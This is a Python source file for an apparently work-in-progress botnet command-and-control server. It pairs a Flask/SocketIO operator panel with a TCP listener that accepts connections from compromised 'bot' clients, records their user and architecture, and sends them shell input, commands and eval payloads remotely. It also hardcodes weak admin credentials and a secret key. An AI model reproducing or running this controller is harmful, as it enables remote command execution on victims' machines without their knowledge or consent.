import socket
import time
import json
from threading import Thread
from flask import Flask, render_template, session, request, Response
from flask_socketio import SocketIO, emit
from functools import wraps

# Loading library depends on how we want to setup the project later,
# for now this will do
try: from server import formatsock
except: import formatsock


''' See accompanying README for TODOs.

 To run: python server.py'''

HOST = 'localhost'
PORT = 1708
allConnections = {}
connected = ''  # temp variable for testing

# Set this variable to "threading", "eventlet" or "gevent" to test the
# different async modes, or leave it set to None for the application to choose
# the best option based on installed packages.
async_mode = None

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode=async_mode)
thread = None

def check_auth(username, password):
    """This function is called to check if a username /
    password combination is valid.
    """
    return username == 'admin' and password == 'secret' #TODO: set username and password

def authenticate():
    """Sends a 401 response that enables basic auth"""
    return Response(
    'Could not verify your access level for that URL.\n'
    'You have to login with proper credentials', 401,
    {'WWW-Authenticate': 'Basic realm="Login Required"'})

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated


@app.route('/', methods=['GET', 'POST'])
@requires_auth
def index():
    global connected
    if request.method == 'POST':
        select = request.form.get('bot')
        connected = str(select)
    return render_template('index.html', async_mode=socketio.async_mode, bot_list=allConnections.keys(),
                           connected=connected)


@socketio.on('send_command', namespace='/bot')
def send_receive(cmd):
    raw_output = ''
    try:
        raw_output = allConnections[connected].send(cmd['data'])
    except:
        emit('response',
             {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(connected), 'user': connected})
    if raw_output:
        output = json.loads(raw_output)
        stdout = output['stdout']
        stderr = output['stderr']
        # TODO: the way we will want to do this is to poll for the most recent stdout/stderr sent
        # from a client and return it as though it was a response, can you send stuff constantly even
        # if the terminal window didn't send a command?
        # -Sumner
        emit('response',
             {'stdout': stdout[:-1], 'stderr': stderr[:-1], 'user': connected})


class BotNet(Thread):
    def __init__(self, tcpsock):
        Thread.__init__(self)
        self.tcpsock = tcpsock

    def run(self):
        while True:
            # TODO: does the 5 here limit us to fice simultaneous targets?
            self.tcpsock.listen(5)
            (clientsock, (ip, port)) = self.tcpsock.accept()
            clientformatsock = formatsock.FormatSocket(clientsock)
            msgbytes = clientformatsock.recv()
            host_info = json.loads(msgbytes.decode('UTF-8'))
            print("[+] Received connection from {}".format(host_info['user']))
            allConnections[host_info['user'][:-1]] = Bot(clientsock, host_info)

            user = host_info['user'][:-1]
            socketio.emit('connection', {'user': user}, namespace='/bot')
            allConnections[user] = Bot(clientsock, host_info)

            # To test continuous stream, stdout is broken into multiple packets, hangs when waiting
            allConnections[user].sendStdin('find /usr/local/lib\n')
            while True:
                print(allConnections[user].recv())

# Background thread to check if we've lost any connections
class BotPinger(Thread):
    def run(self):
        while True:
            for bot in allConnections.values():
                self.ping(bot)
            time.sleep(60)  # checking every minute, this can be changed

    def ping(self, bot):
        # recv returns 0 if client disconnected
        if not bot.sock.rawrecv(1024):
            # TODO: del is maybe a bit much, we should try to gracefully disconnect if possible
            # - Sumner
            del allConnections[bot.user]
            socketio.emit('disconnect', {'user': bot.user}, namespace='/bot')
            print("[-] Lost connection to {}".format(bot.user))

class Bot:
    def __init__(self, sock, host_info):
        self.sock = formatsock.FormatSocket(sock)
        self.arch = host_info['arch'][:-1]
        self.user = host_info['user'][:-1]

    def send(self, cmd, type="stdin"):
        json_str = json.dumps({type:cmd})
        self.sock.send(json_str)
        # TODO: Sumner, need this to return result. Currently hangs.

        # Response: this cannot return a result since sending a command is
        # not guaranteed to return, we need to instead multithread a send operations
        # as well as a recv operation
        # This should be treated like typing into a bash terminal, the moment you hit
        # enter you are not guarenteed to get anything from stdout, in fact you aren't
        # guarenteed to ever get anything, but if you do it'll be sent automatically and
        # we need a thread on recv to deal with it (look into the select library to have one
        # thread dealing with all the recvs at once for efficiency at low throughput)
        # To deal with this I would almost recommend having one area of the GUI dedicated to stdout/stderr
        # and another part dedicated to output from special commands
        # -Sumner

    def sendStdin(self, cmd):
        self.send(cmd, type="stdin")

    def sendCmd(self, cmd):
        self.send(cmd, type="cmd")

    def sendEval(self, cmd):
        self.send(cmd, type="eval")

    def recv(self):
        return self.sock.recv()

if __name__ == "__main__":
    TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPSOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    TCPSOCK.bind((HOST, PORT))
    BotNet(TCPSOCK).start()
    BotPinger().start()

    socketio.run(app, debug=True, use_reloader=False)
